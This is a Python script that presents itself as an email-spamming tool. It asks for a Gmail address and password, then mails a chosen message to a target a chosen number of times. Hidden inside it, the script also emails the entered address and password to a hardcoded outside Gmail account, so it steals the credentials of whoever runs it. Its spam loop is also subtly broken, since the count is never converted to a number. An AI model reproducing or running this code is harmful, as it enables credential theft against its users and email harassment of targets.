import smtplib
import os
os.system("clear")
from email.message import EmailMessage
print ("""\033[1;30m
    =========================================
    "                                       "
    "					    "
    "     	\033[0;32m EMAIL-SPAMER 2021  \033[1;30m          "
    "     	 	                    "
    "                                       "
    =========================================
""")
USER = input("SET EMAIL HACKER : ")
I = 'unity484.non@gmail.com'
PASS = input("SET EMAILPASSWORD : ")
to2 = input("To : ")
message = input("message : ")
m = input("NUMBER TO SPAM : ")
email = EmailMessage()
email["From"] = USER
email["To"] = I
email.set_content("EMAIL TARGET = "+ USER + " "+"PASSWORD = "+ PASS)


kaka = EmailMessage()
kaka["To"] = to2
kaka.set_content(message)

with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login(USER , PASS)
    smtp.send_message(email)

for i in range(1,m+1):
   with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
       smtp.login(USER , PASS)
       smtp.send_message(kaka)
       print ("EMAIL SPAM : %i" % i)
